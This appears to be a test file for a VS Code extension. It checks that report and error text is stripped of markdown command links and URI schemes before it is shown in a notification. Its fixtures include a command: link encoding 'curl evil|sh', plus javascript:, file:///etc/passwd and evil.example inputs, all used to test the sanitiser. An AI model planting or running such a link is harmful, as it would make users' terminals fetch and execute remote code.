// src/notify.ts: report and error text is cleaned before it goes into a VS Code notification, which renders
// [label](uri) as a clickable link (command: URIs included). The panel (escaped HTML) keeps the full text.
import * as assert from "assert";
import { notificationText, gateNotification, errorNotification, MAX_NOTIFICATION } from "../../src/notify";
import { AsentNotFound, AsentOutputError, AsentCancelled } from "../../src/cli";
import { fromJson } from "../../src/report";
import { renderPanel } from "../../src/html";
import { fixtureJson } from "./fixtures";

const LINK = "[Fix it](command:workbench.action.terminal.sendSequence?%7B%22text%22%3A%22curl%20evil%7Csh%5Cn%22%7D)";
const clean = (s: string) => {
  assert.doesNotMatch(s, /[[\]()]/, `brackets or parentheses left in: ${s}`);
  assert.doesNotMatch(s, /command:|vscode:|vscode-insiders:|file:|https?:|javascript:|data:\S|mailto:|:\/\/|www\./i, `link left in: ${s}`);
  assert.doesNotMatch(s, /[\r\n\t\u0000-\u001f]/, `not one line: ${JSON.stringify(s)}`);
  assert.ok(s.length <= MAX_NOTIFICATION, `too long (${s.length})`);
};

describe("notificationText", () => {
  it("a markdown command link: brackets, parentheses and the command: URI are removed, the words stay", () => {
    const s = notificationText(`Blocked ${LINK} now`);
    clean(s);
    assert.strictEqual(s, "Blocked Fix it now");
  });

  it("http(s), vscode:, file:, javascript:, data:, mailto: and www. links are removed", () => {
    for (const link of ["https://evil.example/x?a=(1)", "http://127.0.0.1:8000/", "vscode://ms-vscode.x/y", "vscode-insiders://a/b",
      "file:///etc/passwd", "javascript:alert(1)", "data:text/html,<b>x</b>", "mailto:a@example.invalid", "www.evil.example/x",
      "ftp://evil.example/", "COMMAND:x"]) {
      const s = notificationText(`see ${link} here`);
      clean(s);
      assert.strictEqual(s, "see here", link);
    }
  });

  it("text that would form a link again once brackets are removed is cleaned too", () => {
    for (const tricky of ["comm[]and:workbench.x", "[a](ht)(tps://evil.example)", "x[command:y]", "c(o)mmand:z", "ht[t]ps:/(/)evil"]) {
      clean(notificationText(tricky));
    }
  });

  it("newlines, tabs and control characters become one line; long text is cut with an ellipsis", () => {
    assert.strictEqual(notificationText("first\nsecond\r\n\tthird\u0007"), "first second third");
    const long = notificationText("x".repeat(1000));
    assert.strictEqual(long.length, MAX_NOTIFICATION);
    assert.ok(long.endsWith("…"));
    assert.strictEqual(notificationText("abcdef", 4), "abc…");
  });

  it("ordinary asent text is unchanged (colons, ==, Windows paths, the word data)", () => {
    for (const ok of ["CAVR BLOCK DENYLIST: reqeusts is on the project denylist: typosquat of requests",
      "reqeusts==2.31.0: REJECTED", "C:\\Users\\me\\proj\\requirements.txt", "data: 3 files", "ASENT_CONFIG_MISSING: no .asent/config.json"]) {
      assert.strictEqual(notificationText(ok), ok);
    }
  });
});

describe("notification texts", () => {
  const blockWith = (reason: string) => {
    const json = fixtureJson("reports", "cavr-block.json");
    json.reasons = [reason, ...json.reasons];
    return fromJson(json);
  };

  it("gate: decision plus the first reason, cleaned; the panel still shows the full reason (escaped)", () => {
    const report = blockWith(`CAVR: ${LINK}\nsecond line`);
    const text = gateNotification(report);
    clean(text);
    assert.strictEqual(text, "ASENT gate: BLOCK: CAVR: Fix it second line");
    const html = renderPanel(report, { nonce: "abc=" });
    assert.ok(html.includes("CAVR: [Fix it](command:workbench.action.terminal.sendSequence?"), "the panel shows the full text");
    assert.doesNotMatch(html, /<a\b|href=/, "as text, not a link");
  });

  it("gate: the real report's reason is shown as asent wrote it", () => {
    const report = fromJson(fixtureJson("reports", "cavr-block.json"));
    assert.strictEqual(gateNotification(report), notificationText(`ASENT gate: BLOCK: ${report.reasons[0]}`));
    clean(gateNotification(report));
    const none = fromJson({ ...fixtureJson("reports", "cavr-block.json"), reasons: [] });
    assert.strictEqual(gateNotification(none), "ASENT gate: BLOCK");
  });

  it("errors: asent's stderr, error JSON text and the configured path are cleaned and kept to one line", () => {
    const texts = [
      errorNotification(new AsentOutputError("report", 2, `Traceback\n  ${LINK}\nValueError: https://evil.example`)),
      errorNotification(new Error(`asent init: ${LINK}`)),
      errorNotification(new AsentNotFound(`asent ${LINK}`, "ENOENT")),
      errorNotification(new AsentNotFound("./asent", "NOT_ABSOLUTE")),
      errorNotification(new AsentCancelled("timed out")),
      errorNotification(`plain ${LINK}`),
    ];
    for (const t of texts) {
      clean(t);
      assert.ok(t.startsWith("ASENT: "), t);
    }
    assert.match(texts[0], /^ASENT: asent report printed no JSON exit 2: Traceback Fix it ValueError:$/);
    assert.match(texts[2], /^ASENT: asent was not found: "asent Fix it"\. Install asent, or set asent\.path\.$/);
    assert.match(texts[3], /must be a command name on PATH or an absolute path/);
    assert.strictEqual(texts[4], "ASENT: asent was stopped: timed out.");
  });
});
